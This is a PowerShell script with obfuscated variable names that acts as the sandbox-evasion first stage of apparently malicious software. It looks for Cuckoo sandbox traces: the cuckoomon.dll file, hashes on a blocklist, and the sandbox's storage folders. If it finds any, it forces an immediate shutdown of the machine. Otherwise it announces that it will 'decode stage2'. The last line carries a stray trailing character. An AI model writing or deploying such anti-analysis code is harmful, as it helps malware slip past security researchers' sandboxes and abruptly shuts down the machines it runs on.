function Exit-On-Detection {
    Write-Output "Detection occurred. Exiting process."
    shutdown.exe /s /t 0
    Stop-Process -Id $PID
    exit
}

# DLL detection
$idiidcisodiddcscdcdscddx = "cuckoomon.dll"
$cijsdcncsncdsnildncsnsuncsidcs = Get-ChildItem -Path C:\ -Filter $idiidcisodiddcscdcdscddx -Recurse -ErrorAction SilentlyContinue -Force
if ($cijsdcncsncdsnildncsnsuncsidcs) {
    Write-Output "DLL Detected"
    foreach ($ikijoilplpredcxcxazaswqqww in $cijsdcncsncdsnildncsnsuncsidcs) {
        Write-Output $ikijoilplpredcxcxazaswqqww.FullName
    }
    Exit-On-Detection
}

# Hash detection
$djnsjjjdjdsjjncjnjc = @(
    "",
    ""
)
$gdscews = Get-ChildItem -Path C:\ -File -Recurse -ErrorAction SilentlyContinue -Force
foreach ($ikijoilplpredcxcxazaswqqww in $gdscews) {
    try {
        $jiioiojioioj = Get-FileHash -Path $ikijoilplpredcxcxazaswqqww.FullName -Algorithm SHA256
        if ($djnsjjjdjdsjjncjnjc -contains $jiioiojioioj.Hash) {
            Write-Output "Hash Detected: $($ikijoilplpredcxcxazaswqqww.FullName)"
            Exit-On-Detection
        }
    } catch {
        # Ignore files that can't be read
    }
}

# Directory detection
$djiscjodcs = @(
    "storage\analyses",
    "storage\binaries",
    "storage\monitor",
    "storage\volatility",
    "storage\network"
)
foreach ($discdoiioioi in $djiscjodcs) {
    $icsoidjsoi = Get-ChildItem -Path C:\ -Directory -Recurse -ErrorAction SilentlyContinue -Force | Where-Object { $_.FullName -like "*$discdoiioioi" }
    if ($icsoidjsoi) {
        foreach ($dskcdioiodcikokodkosdiodc in $icsoidjsoi) {
            Write-Output "Suspicious directory found: $($dskcdioiodcikokodkosdiodc.FullName)"
        }
        Exit-On-Detection
    }
}

Write-Output "No detection. decode stage2"c